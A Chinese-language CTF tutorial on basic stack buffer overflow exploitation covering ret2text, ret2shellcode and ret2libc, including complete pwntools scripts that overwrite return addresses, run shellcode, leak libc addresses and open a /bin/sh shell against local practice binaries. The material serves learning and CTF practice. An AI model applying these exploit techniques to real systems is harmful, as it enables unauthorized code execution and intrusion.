# 栈溢出基础：ret2text / ret2shellcode / ret2libc

## 1. 概述

栈溢出（Stack Buffer Overflow）是最经典的二进制漏洞利用方式。当程序向栈上缓冲区写入超过其容量的数据时，会覆盖栈上保存的返回地址、EBP等关键数据，从而劫持控制流。

在CTF断网离线场景下，栈溢出是PWN题的入门必修课。三类基础攻击模式：
- **ret2text**：返回到程序已有的代码片段（如后门函数）
- **ret2shellcode**：返回到写入的shellcode（要求NX关闭）
- **ret2libc**：返回到libc中的函数（如system("/bin/sh")），绕过NX

## 2. 核心原理

### 2.1 栈帧结构（x86-64）

```
高地址
+----------------+
| 参数n          |  [RSP+8*n+8]
| ...            |
| 参数7          |  [RSP+16]      <-- 第7个参数开始用栈传
| 返回地址       |  [RSP+8]
| saved RBP      |  [RSP] <-- RBP
| local vars     |  [RBP-8] ...
| ...            |
低地址
```

### 2.2 32位 vs 64位调用约定

| 特性 | x86 (32bit) | x86-64 (64bit) |
|------|------------|----------------|
| 参数传递 | 全部栈传 | rdi, rsi, rdx, rcx, r8, r9; 之后栈传 |
| 返回地址 | EIP | RIP |
| 帧指针 | EBP | RBP |
| 栈指针 | ESP | RSP |
| ret2libc | 参数直接跟在返回地址后 | 需要pop rdi; ret gadget |

### 2.3 溢出判断

```python
# pwntools cyclic pattern 定位偏移
from pwn import *
pattern = cyclic(200)   # 生成200字节不重复模式
# 程序崩溃后查看RIP值
offset = cyclic_find(0x61616178)  # 根据RIP值反查偏移
```

## 3. 关键技巧/检测方法

### 3.1 保护检查（checksec）

```bash
# 离线环境必备命令
checksec --file=./binary
# 输出示例: Arch: amd64, RELRO: Partial, Stack: No canary, NX: Enabled, PIE: No
```

关键指标：
- **NX enabled**：无法ret2shellcode，需ret2libc/ROP
- **Canary**：绕过方式有限（泄露canary、改写__stack_chk_fail等）
- **PIE enabled**：需先泄露基址
- **Partial RELRO**：GOT可写，可覆写

### 3.2 GDB调试要点

```bash
# 断点
b *0x401234
# 查看栈帧
stack 30
# 查看寄存器
info registers
# 查看内存映射
vmmap
# 查找gadget（离线）
ROPgadget --binary ./binary --ropchain  # 或保存为离线工具
```

## 4. 常见误区与注意事项

1. **栈对齐问题**：Ubuntu 18.04+要求16字节栈对齐，system()调用前可能需要额外的`ret` gadget
2. **坏字符过滤**：shellcode或地址中可能包含`\x00`、`\x0a`等坏字符，需编码或调整
3. **ASLR影响**：即使本地地址固定，远程环境ASLR使地址随机化，需泄露地址
4. **32位payload布局**：`padding + ret_addr + arg1 + arg2 + ...`（没有pop rdi需求）

## 5. 实战示例

### 5.1 ret2text（存在后门函数）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ret2text 示例：程序存在后门函数 backdoor() 直接调 system("/bin/sh")
编译命令: gcc -no-pie -fno-stack-protector -z execstack -o ret2text ret2text.c
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

# 本地调试使用 process，远程使用 remote
# p = process('./ret2text')
p = remote('127.0.0.1', 9999)

# 1. 获取后门函数地址（checksec确认无PIE）
backdoor_addr = 0x401176  # objdump -d ./ret2text | grep backdoor
# 在离线CTF中，使用: elf = ELF('./ret2text'); backdoor_addr = elf.symbols['backdoor']

# 2. 确定偏移量
# 方法1: cyclic pattern
# pattern = cyclic(200) 发送后查看RIP -> cyclic_find(0x...)
# 方法2: 反汇编分析，如 sub rsp, 0x30 => offset = 0x30 + 8 (saved rbp) = 56
offset = 0x30 + 8  # 假设缓冲区离rbp 0x30

# 3. 构造payload
payload = b'A' * offset          # 填充到返回地址
payload += p64(backdoor_addr)     # 覆盖返回地址为后门函数

# 4. 发送payload
p.sendlineafter(b'Input:', payload)
p.interactive()
```

### 5.2 ret2shellcode（NX关闭时）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ret2shellcode 示例：溢出到已知地址的缓冲区并执行shellcode
编译: gcc -no-pie -fno-stack-protector -z execstack -o ret2sc ret2sc.c
"""
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

p = process('./ret2sc')

# 1. 找一块可写可执行内存
# vmmap 查看: rwxp段，如 .bss 或已知 buffer
buf_addr = 0x404080  # 假设buffer在.bss节且NX关闭

# 2. 64位shellcode（execve("/bin/sh", 0, 0)）
shellcode = asm(shellcraft.sh())

# 3. 溢出偏移
offset = 0x30 + 8

# 4. payload构造：先放shellcode到缓冲区，返回地址指向缓冲区
payload = shellcode.ljust(offset, b'\x90')  # NOP sled 填充
payload += p64(buf_addr)                     # 返回地址指向buffer

p.sendlineafter(b'Input:', payload)
p.interactive()
```

### 5.3 ret2libc（NX开启，泄露libc地址）

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ret2libc 示例：通过puts泄露libc基址，计算system和/bin/sh地址
编译: gcc -no-pie -fno-stack-protector -o ret2libc ret2libc.c
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./ret2libc')
elf = ELF('./ret2libc')

# ---- 阶段一：泄露libc地址 ----
# 构造rop: pop rdi; ret -> puts@GOT -> puts@PLT -> main (循环回到main)
# 需要三个gadget
pop_rdi_ret = 0x401283  # ROPgadget --binary ./ret2libc | grep "pop rdi"
ret = 0x40101a           # ret gadget用于栈对齐

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

offset = 0x30 + 8

# Payload 1: 泄露puts的真实地址
payload1 = b'A' * offset
payload1 += p64(ret)               # 栈对齐（Ubuntu 18+必须）
payload1 += p64(pop_rdi_ret)       # pop rdi; ret
payload1 += p64(puts_got)          # rdi = puts@GOT (puts的真实地址)
payload1 += p64(puts_plt)          # 调用puts打印
payload1 += p64(main_addr)         # 返回main，准备第二阶段的利用

p.sendlineafter(b'Input:', payload1)
p.recvline()  # 跳过输出行

leaked = p.recvline().strip()
leaked = u64(leaked.ljust(8, b'\x00'))  # 解析泄露的64位地址
log.info(f"Leaked puts@libc = {hex(leaked)}")

# ---- 阶段二：计算libc基址 ----
# 在离线CTF中，需用提供的libc文件计算偏移
# libc = ELF('./libc.so.6')  # 题目提供的libc
# libc_base = leaked - libc.symbols['puts']
# system_addr = libc_base + libc.symbols['system']
# bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 假设已知偏移（无libc文件时需搜索libc database或已知环境）
puts_offset = 0x80ed0      # 示例偏移，实际需匹配libc版本
system_offset = 0x4f420
bin_sh_offset = 0x1b3e1a

libc_base = leaked - puts_offset
system_addr = libc_base + system_offset
bin_sh_addr = libc_base + bin_sh_offset

log.info(f"libc_base = {hex(libc_base)}")
log.info(f"system   = {hex(system_addr)}")
log.info(f"/bin/sh  = {hex(bin_sh_addr)}")

# ---- 阶段三：getshell ----
payload2 = b'A' * offset
payload2 += p64(ret)
payload2 += p64(pop_rdi_ret)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)

p.sendlineafter(b'Input:', payload2)
p.interactive()
```

### 5.4 32位ret2libc

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
32位ret2libc示例：32位调用约定更简单，参数直接放在栈上
编译: gcc -m32 -no-pie -fno-stack-protector -o ret2libc32 ret2libc.c
"""
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

p = process('./ret2libc32')
elf = ELF('./ret2libc32')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

offset = 0x28 + 4  # 64位(rbp+8), 32位(ebp+4)

# 阶段一：泄露 (32位用p32, 参数直接放返回地址后)
payload1 = b'A' * offset
payload1 += p32(puts_plt)    # 返回地址 = puts PLT
payload1 += p32(main_addr)   # puts的返回地址 -> main
payload1 += p32(puts_got)    # puts的参数1 (32位栈传参)

p.sendlineafter(b'Input:', payload1)
p.recvline()
leaked = u32(p.recvn(4))
log.info(f"Leaked puts = {hex(leaked)}")

# 阶段二：计算
libc_base = leaked - 0x67b10   # 假设偏移
system_addr = libc_base + 0x3ce10
bin_sh_addr = libc_base + 0x17b88f

# 阶段三：getshell
payload2 = b'A' * offset
payload2 += p32(system_addr)   # 返回地址
payload2 += p32(0xdeadbeef)    # system的返回地址(随意)
payload2 += p32(bin_sh_addr)   # 参数1

p.sendlineafter(b'Input:', payload2)
p.interactive()
```

## 6. 相关知识点

- **ROP链构造**：详见 02-ROP链构造技术.md
- **Canary绕过**：通过格式化字符串泄露、__stack_chk_fail劫持
- **libc版本识别**：使用libc-database或已知的libc偏移表
- **one_gadget**：单地址getshell，条件要求满足[rsp+0xXX]==NULL等
- **pwntools工具链**：`checksec`、`ROPgadget`、`elf.symbols`、`elf.got`、`elf.plt`
